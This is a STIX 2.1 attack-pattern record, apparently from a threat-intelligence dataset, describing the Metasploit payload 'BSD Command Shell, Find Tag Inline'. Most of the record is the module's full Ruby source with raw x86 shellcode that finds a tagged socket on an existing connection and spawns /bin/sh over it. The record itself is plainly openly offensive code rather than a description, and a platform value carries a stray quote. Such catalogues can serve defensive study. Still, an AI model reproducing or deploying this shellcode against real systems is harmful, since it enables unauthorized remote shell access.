{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cfe1cdd4-003a-4778-9528-abea1b73e3b9",
    "created": "2024-08-14T16:33:19.409227Z",
    "modified": "2024-08-14T16:33:19.409231Z",
    "name": "BSD Command Shell, Find Tag Inline",
    "description": "Spawn a shell on an established connection (proxy/nat safe)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/x86/shell_find_tag.rb",
            "external_id": "shell_find_tag.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 70\n\n  include Msf::Payload::Single\n  include Msf::Payload::Bsd\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'BSD Command Shell, Find Tag Inline',\n      'Description'   => 'Spawn a shell on an established connection (proxy/nat safe)',\n      'Author'        => 'skape',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::FindTag,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'TAG' => [ 0x1b, 'RAW' ],\n            },\n          'Payload' =>\n            \"\\x31\\xd2\\x52\\x89\\xe6\\x52\\x52\\xb2\\x80\\x52\\xb6\\x0c\\x52\\x56\\x52\\x52\" +\n            \"\\x66\\xff\\x46\\xe8\\x6a\\x1d\\x58\\xcd\\x80\\x81\\x3e\\x6d\\x73\\x66\\x21\\x75\" +\n            \"\\xef\\x5a\\x5f\\x6a\\x02\\x59\\x6a\\x5a\\x58\\x51\\x57\\x51\\xcd\\x80\\x49\\x79\" +\n            \"\\xf5\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\" +\n            \"\\x53\\x53\\xb0\\x3b\\xcd\\x80\"\n        }\n      ))\n  end\n\n  #\n  # Ensures the setting of TAG to a four byte value\n  #\n  def generate(_opts = {})\n    datastore['TAG'] = _find_tag\n\n    super\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}